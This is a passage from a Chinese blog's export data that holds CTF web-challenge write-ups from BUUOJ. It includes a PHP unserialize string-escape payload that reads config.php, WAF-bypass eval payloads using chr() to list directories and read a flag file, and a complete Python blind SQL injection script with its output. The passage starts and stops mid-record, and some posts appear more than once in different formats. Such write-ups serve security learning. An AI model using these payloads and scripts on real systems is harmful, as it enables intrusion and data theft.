class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题中<code>www.zip</code>中包含源码，下载<del>后进行代码审计（不会）</del>翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件<br>config.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;</span><br><span class=\"line\">    $config[&#39;username&#39;] &#x3D; &#39;root&#39;;</span><br><span class=\"line\">    $config[&#39;password&#39;] &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $config[&#39;database&#39;] &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $flag &#x3D; &#39;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>查看index.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class=\"line\">\t\t\t$_SESSION[<span class=\"string\">'username'</span>] = $username;</span><br><span class=\"line\">\t\t\theader(<span class=\"string\">'Location: profile.php'</span>);<span class=\"comment\">//登入后跳转到profile.php</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">exit</span>;\t</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>查看profile.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>   </span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(<span class=\"string\">'class.php'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'username'</span>] == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Login First'</span>);</span><br><span class=\"line\">&#125;   </span><br><span class=\"line\">$username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">$profile=$user-&gt;show_profile($username);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($profile  == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    header(<span class=\"string\">'Location: update.php'</span>); <span class=\"comment\">//$profile为空，跳转到update.php</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    $profile = unserialize($profile); <span class=\"comment\">//一般看见unserialize()会考虑反序列化漏洞，</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));<span class=\"comment\">//file_get_contents()此函数可以获得文件内容</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>update.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'phone'</span>] &amp;&amp; $_POST[<span class=\"string\">'email'</span>] &amp;&amp; $_POST[<span class=\"string\">'nickname'</span>] &amp;&amp; $_FILES[<span class=\"string\">'photo'</span>]) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^\\d&#123;11&#125;$/'</span>, $_POST[<span class=\"string\">'phone'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid phone'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class=\"string\">'email'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid email'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $file = $_FILES[<span class=\"string\">'photo'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($file[<span class=\"string\">'size'</span>] &lt; <span class=\"number\">5</span> <span class=\"keyword\">or</span> $file[<span class=\"string\">'size'</span>] &gt; <span class=\"number\">1000000</span>)</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Photo size error'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    move_uploaded_file($file[<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]));</span><br><span class=\"line\">    $profile[<span class=\"string\">'phone'</span>] = $_POST[<span class=\"string\">'phone'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'email'</span>] = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'nickname'</span>] = $_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'photo'</span>] = <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    $user-&gt;update_profile($username, serialize($profile));<span class=\"comment\">//将$profile序列化，执行过滤函数</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看update_profile()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update_profile</span><span class=\"params\">($username, $new_profile)</span> </span>&#123;</span><br><span class=\"line\">    $username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">    $new_profile = <span class=\"keyword\">parent</span>::filter($new_profile); </span><br><span class=\"line\">    $where = <span class=\"string\">\"username = '$username'\"</span>; </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::update(<span class=\"keyword\">$this</span>-&gt;table, <span class=\"string\">'profile'</span>, $new_profile, $where);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看filter()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">    $escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>); </span><br><span class=\"line\">    $escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; </span><br><span class=\"line\">    $string = preg_replace($escape, <span class=\"string\">'_'</span>, $string); <span class=\"comment\">//将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” </span></span><br><span class=\"line\">    $safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">    $safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string); <span class=\"comment\">//将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在update_profile()，返回到profile.php.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile = unserialize($profile); <span class=\"comment\">//反序列化$profile</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));</span><br></pre></td></tr></table></figure>\n\n<p>序列化后</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile&#x3D;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:8:&quot;12@12.12&quot;;s:8:&quot;nickname&quot;;s:4:&quot;1234&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>要让$photo得到的文件是config.php也就是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;</span><br></pre></td></tr></table></figure>\n<p>变成 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;</span><br></pre></td></tr></table></figure>\n<p>序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。</p>\n<p>因为nickname有长度限制使用数组可以绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>\n<p>让nickname的值为<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34,传入34个where</p>\n<h3 id=\"0x03-开始操作\"><a href=\"#0x03-开始操作\" class=\"headerlink\" title=\"0x03 开始操作\"></a>0x03 开始操作</h3><p><img src=\"/pic/1.png\" alt=\"1\"> 传入参数</p>\n<p>访问profile.php</p>\n<p><img src=\"/pic/2.png\" alt=\"2\"></p>\n<p>将base64解码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'password'</span>] = <span class=\"string\">'qwertyuiop'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'database'</span>] = <span class=\"string\">'challenges'</span>;</span><br><span class=\"line\">$flag = <span class=\"string\">'flag&#123;94b7c4b2-866d-4189-9b0a-abdf22990071&#125;'</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>"},{"title":"buuoj刷题记录2","date":"2019-12-26T12:16:12.000Z","_content":"\n## [Roarctf]easy_calc\n\n### 0x00 基础\n\nphp内置读取文件内容函数\n\n```\nfile_get_contents\nreadfile\nfile\n```\n\n目录扫描函数\n\n```\nscandir\n```\n\n<!--more-->\n\n字符转换函数\n\n```\nhex2bin(\"979797\")->\"aaa\"\nchr(95)->\"a\"\n```\n\n输出函数\n\n```\nvar_dump()\nprintf()\n```\n\n`parse_str`函数通常被自动应用于`get`、`post`请求和`cookie`中。使用`parse_str`解析规则绕过waf\n\n### 0x01 分析\n\n查看源码，发现calc.php\n\n```php\n<script>\n    $('#calc').submit(function(){\n        $.ajax({\n            url:\"calc.php?num=\"+encodeURIComponent($(\"#content\").val()),\n            type:'GET',\n            success:function(data){\n                $(\"#result\").html(`<div class=\"alert alert-success\">\n            <strong>答案:</strong>${data}\n            </div>`);\n            },\n            error:function(){\n                alert(\"这啥?算不来!\");\n            }\n        })\n        return false;\n    })\n</script>\n```\n\n进入calc.php,进行代码审计。\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {    \n                        die(\"what are you want to do?\");//如果包含黑名单中的字符，程序退出\n                }\n        }\n        eval('echo '.$str.';');\n}\n?> \n```\n\n### 0x02 开始操作\n\n传入`1+1` 显示`403 Forbidden` 传入`1%2b1`就可以。必须传入urldecode后。查看`phpinfo()`，也是`403 Forbidden`，利用PHP自动解析函数`parser_str()`绕过，纤细介绍查看[参考连接](https://www.freebuf.com/articles/web/213359.html)。\n\n扫描目录使用`scandir()`因为`/ '  \"`被过滤无法直接使用`/`，使用`chr()`转换payload= `?+num=print_r(scandir(chr(47)))`\n\n```\nArray ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => f1agg [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) 1\n```\n\n使用PHP内置函数获`file_get_contents()`获取文件内容payload=`?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`\n\n```\nflag{d09c31b7-d1a1-45a2-b35b-65452a1335ef} 43\n```\n\n","source":"_posts/buuoj刷题记录2.md","raw":"---\ntitle: buuoj刷题记录2\ndate: 2019-12-26 20:16:12\ntags:\n - ctf\n - Roarctf\n - web\n - buuoj\n---\n\n## [Roarctf]easy_calc\n\n### 0x00 基础\n\nphp内置读取文件内容函数\n\n```\nfile_get_contents\nreadfile\nfile\n```\n\n目录扫描函数\n\n```\nscandir\n```\n\n<!--more-->\n\n字符转换函数\n\n```\nhex2bin(\"979797\")->\"aaa\"\nchr(95)->\"a\"\n```\n\n输出函数\n\n```\nvar_dump()\nprintf()\n```\n\n`parse_str`函数通常被自动应用于`get`、`post`请求和`cookie`中。使用`parse_str`解析规则绕过waf\n\n### 0x01 分析\n\n查看源码，发现calc.php\n\n```php\n<script>\n    $('#calc').submit(function(){\n        $.ajax({\n            url:\"calc.php?num=\"+encodeURIComponent($(\"#content\").val()),\n            type:'GET',\n            success:function(data){\n                $(\"#result\").html(`<div class=\"alert alert-success\">\n            <strong>答案:</strong>${data}\n            </div>`);\n            },\n            error:function(){\n                alert(\"这啥?算不来!\");\n            }\n        })\n        return false;\n    })\n</script>\n```\n\n进入calc.php,进行代码审计。\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {    \n                        die(\"what are you want to do?\");//如果包含黑名单中的字符，程序退出\n                }\n        }\n        eval('echo '.$str.';');\n}\n?> \n```\n\n### 0x02 开始操作\n\n传入`1+1` 显示`403 Forbidden` 传入`1%2b1`就可以。必须传入urldecode后。查看`phpinfo()`，也是`403 Forbidden`，利用PHP自动解析函数`parser_str()`绕过，纤细介绍查看[参考连接](https://www.freebuf.com/articles/web/213359.html)。\n\n扫描目录使用`scandir()`因为`/ '  \"`被过滤无法直接使用`/`，使用`chr()`转换payload= `?+num=print_r(scandir(chr(47)))`\n\n```\nArray ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => f1agg [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) 1\n```\n\n使用PHP内置函数获`file_get_contents()`获取文件内容payload=`?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`\n\n```\nflag{d09c31b7-d1a1-45a2-b35b-65452a1335ef} 43\n```\n\n","slug":"buuoj刷题记录2","published":1,"updated":"2020-02-06T08:17:02.160Z","_id":"ck4pc9e4q0003187eglmn5tk2","comments":1,"layout":"post","photos":[],"link":""},{"title":"buuoj刷题记录3","date":"2019-12-27T04:42:41.000Z","_content":"\n## [CISCN2019 华北赛区 Day2 Web1]Hack World\n\n### 0x00 基础\n\nSQL盲注，使用`if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）`函数一个一个的猜字符，过滤绕过，空格可以使用`+、\\t、/**/、()`绕过。\n```\nif(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值\nascii(char)\nsubstr（str,pos,len)\n```\n<!--more-->\n\n### 0x01 分析\n\n题目提示\n\n```\nflag{} 里为 uuid\n```\n\n访问页面\n\n![](/pic/3.jpg)\n\n\n\n使用burp suite进行sql fuzz测试，以下字符被过滤\n\n|       %20        | 482  | SQL Injection Checked |\n| :--------------: | ---- | --------------------- |\n|       AND        | 482  | SQL Injection Checked |\n|      DELETE      | 482  | SQL Injection Checked |\n|     END-EXEC     | 482  | SQL Injection Checked |\n|      GROUP       | 482  | SQL Injection Checked |\n|      INSERT      | 482  | SQL Injection Checked |\n|       INTO       | 482  | SQL Injection Checked |\n|      LIMIT       | 482  | SQL Injection Checked |\n|        OR        | 482  | SQL Injection Checked |\n|      UNION       | 482  | SQL Injection Checked |\n|      UPDATE      | 482  | SQL Injection Checked |\n|        +         | 482  | SQL Injection Checked |\n|        /         | 482  | SQL Injection Checked |\n|        -         | 482  | SQL Injection Checked |\n|        *         | 482  | SQL Injection Checked |\n|        `         | 482  | SQL Injection Checked |\n|        \"         | 482  | SQL Injection Checked |\n|       \\|\\|       | 482  | SQL Injection Checked |\n|        &&        | 482  | SQL Injection Checked |\n|       %23        | 482  | SQL Injection Checked |\n|;|482|SQL Injection Checked |\n`if,substr,ascii,<,>,=,(),/t`都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用`/t、( )代替`\n\n### 0x02 开始操作\n\n```pytho\n# -*- coding: utf-8 -*-\n# @Time    : 12/27/2019 6:11 PM\nimport requests\nimport time\n\nurl = \"http://97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn/index.php\"\nresult = ''\n\nfor x in range(1, 43):\n    high = 126\n    low = 45\n    mid = (low + high) // 2\n\n\n    while high - low > 1:\n        payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)\" % (x, mid)\n        data = {\n            \"id\": payload\n        }\n        time.sleep(0.3)\n        res = requests.post(url, data = data)\n        if 'Hello' in res.text:\n            low = mid\n        else:\n            high = mid\n        mid = (low + high) // 2\n\n    if high - low == 1:\n        payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)\" % (x, high)\n        data = {\n            \"id\": payload\n        }\n        response = requests.post(url, data=data)\n        if 'Hello' in response.text:\n            result += chr(int(mid+1))\n        else :\n            result += chr(int(mid))\n    else :\n        result += chr(int(mid))\n    print(result)\n```\n\n```\nf\nfl\nfla\nflag\nflag{\nflag{a\nflag{a2\nflag{a22\nflag{a22c\nflag{a22cf\nflag{a22cf6\nflag{a22cf69\nflag{a22cf690\nflag{a22cf690-\nflag{a22cf690-3\nflag{a22cf690-34\nflag{a22cf690-342\nflag{a22cf690-342a\nflag{a22cf690-342a-\nflag{a22cf690-342a-4\nflag{a22cf690-342a-4b\nflag{a22cf690-342a-4bf\nflag{a22cf690-342a-4bf4\nflag{a22cf690-342a-4bf4-\nflag{a22cf690-342a-4bf4-8\nflag{a22cf690-342a-4bf4-88\nflag{a22cf690-342a-4bf4-885\nflag{a22cf690-342a-4bf4-885b\nflag{a22cf690-342a-4bf4-885b-\nflag{a22cf690-342a-4bf4-885b-d\nflag{a22cf690-342a-4bf4-885b-df\nflag{a22cf690-342a-4bf4-885b-df3\nflag{a22cf690-342a-4bf4-885b-df33\nflag{a22cf690-342a-4bf4-885b-df332\nflag{a22cf690-342a-4bf4-885b-df332d\nflag{a22cf690-342a-4bf4-885b-df332d4\nflag{a22cf690-342a-4bf4-885b-df332d44\nflag{a22cf690-342a-4bf4-885b-df332d446\nflag{a22cf690-342a-4bf4-885b-df332d4469\nflag{a22cf690-342a-4bf4-885b-df332d44698\nflag{a22cf690-342a-4bf4-885b-df332d44698d\nflag{a22cf690-342a-4bf4-885b-df332d44698d}\n```\n\n因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。\n\n\n\n","source":"_posts/buuoj刷题记录3.md","raw":"---\ntitle: buuoj刷题记录3\ndate: 2019-12-27 12:42:41\ntags:\n - ciscn\n - web\n - ctf\n - buuctf\n---\n\n## [CISCN2019 华北赛区 Day2 Web1]Hack World\n\n### 0x00 基础\n\nSQL盲注，使用`if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）`函数一个一个的猜字符，过滤绕过，空格可以使用`+、\\t、/**/、()`绕过。\n```\nif(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值\nascii(char)\nsubstr（str,pos,len)\n```\n<!--more-->\n\n### 0x01 分析\n\n题目提示\n\n```\nflag{} 里为 uuid\n```\n\n访问页面\n\n![](/pic/3.jpg)\n\n\n\n使用burp suite进行sql fuzz测试，以下字符被过滤\n\n|       %20        | 482  | SQL Injection Checked |\n| :--------------: | ---- | --------------------- |\n|       AND        | 482  | SQL Injection Checked |\n|      DELETE      | 482  | SQL Injection Checked |\n|     END-EXEC     | 482  | SQL Injection Checked |\n|      GROUP       | 482  | SQL Injection Checked |\n|      INSERT      | 482  | SQL Injection Checked |\n|       INTO       | 482  | SQL Injection Checked |\n|      LIMIT       | 482  | SQL Injection Checked |\n|        OR        | 482  | SQL Injection Checked |\n|      UNION       | 482  | SQL Injection Checked |\n|      UPDATE      | 482  | SQL Injection Checked |\n|        +         | 482  | SQL Injection Checked |\n|        /         | 482  | SQL Injection Checked |\n|        -         | 482  | SQL Injection Checked |\n|        *         | 482  | SQL Injection Checked |\n|        `         | 482  | SQL Injection Checked |\n|        \"         | 482  | SQL Injection Checked |\n|       \\|\\|       | 482  | SQL Injection Checked |\n|        &&        | 482  | SQL Injection Checked |\n|       %23        | 482  | SQL Injection Checked |\n|;|482|SQL Injection Checked |\n`if,substr,ascii,<,>,=,(),/t`都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用`/t、( )代替`\n\n### 0x02 开始操作\n\n```pytho\n# -*- coding: utf-8 -*-\n# @Time    : 12/27/2019 6:11 PM\nimport requests\nimport time\n\nurl = \"http://97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn/index.php\"\nresult = ''\n\nfor x in range(1, 43):\n    high = 126\n    low = 45\n    mid = (low + high) // 2\n\n\n    while high - low > 1:\n        payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)\" % (x, mid)\n        data = {\n            \"id\": payload\n        }\n        time.sleep(0.3)\n        res = requests.post(url, data = data)\n        if 'Hello' in res.text:\n            low = mid\n        else:\n            high = mid\n        mid = (low + high) // 2\n\n    if high - low == 1:\n        payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)\" % (x, high)\n        data = {\n            \"id\": payload\n        }\n        response = requests.post(url, data=data)\n        if 'Hello' in response.text:\n            result += chr(int(mid+1))\n        else :\n            result += chr(int(mid))\n    else :\n        result += chr(int(mid))\n    print(result)\n```\n\n```\nf\nfl\nfla\nflag\nflag{\nflag{a\nflag{a2\nflag{a22\nflag{a22c\nflag{a22cf\nflag{a22cf6\nflag{a22cf69\nflag{a22cf690\nflag{a22cf690-\nflag{a22cf690-3\nflag{a22cf690-34\nflag{a22cf690-342\nflag{a22cf690-342a\nflag{a22cf690-342a-\nflag{a22cf690-342a-4\nflag{a22cf690-342a-4b\nflag{a22cf690-342a-4bf\nflag{a22cf690-342a-4bf4\nflag{a22cf690-342a-4bf4-\nflag{a22cf690-342a-4bf4-8\nflag{a22cf690-342a-4bf4-88\nflag{a22cf690-342a-4bf4-885\nflag{a22cf690-342a-4bf4-885b\nflag{a22cf690-342a-4bf4-885b-\nflag{a22cf690-342a-4bf4-885b-d\nflag{a22cf690-342a-4bf4-885b-df\nflag{a22cf690-342a-4bf4-885b-df3\nflag{a22cf690-342a-4bf4-885b-df33\nflag{a22cf690-342a-4bf4-885b-df332\nflag{a22cf690-342a-4bf4-885b-df332d\nflag{a22cf690-342a-4bf4-885b-df332d4\nflag{a22cf690-342a-4bf4-885b-df332d44\nflag{a22cf690-342a-4bf4-885b-df332d446\nflag{a22cf690-342a-4bf4-885b-df332d4469\nflag{a22cf690-342a-4bf4-885b-df332d44698\nflag{a22cf690-342a-4bf4-885b-df332d44698d\nflag{a22cf690-342a-4bf4-885b-df332d44698d}\n```\n\n因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。\n\n\n\n","slug":"buuoj刷题记录3","published":1,"updated":"2019-12-28T13:19:17.261Z","_id":"ck4pc9e4v0005187eb7yv5rj5","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"CISCN2019-华北赛区-Day2-Web1-Hack-World\"><a href=\"#CISCN2019-华北赛区-Day2-Web1-Hack-World\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day2 Web1]Hack World\"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>SQL盲注，使用<code>if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）</code>函数一个一个的猜字符，过滤绕过，空格可以使用<code>+、\\t、/**/、()</code>绕过。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(表达式1，表达式2，表达式3)  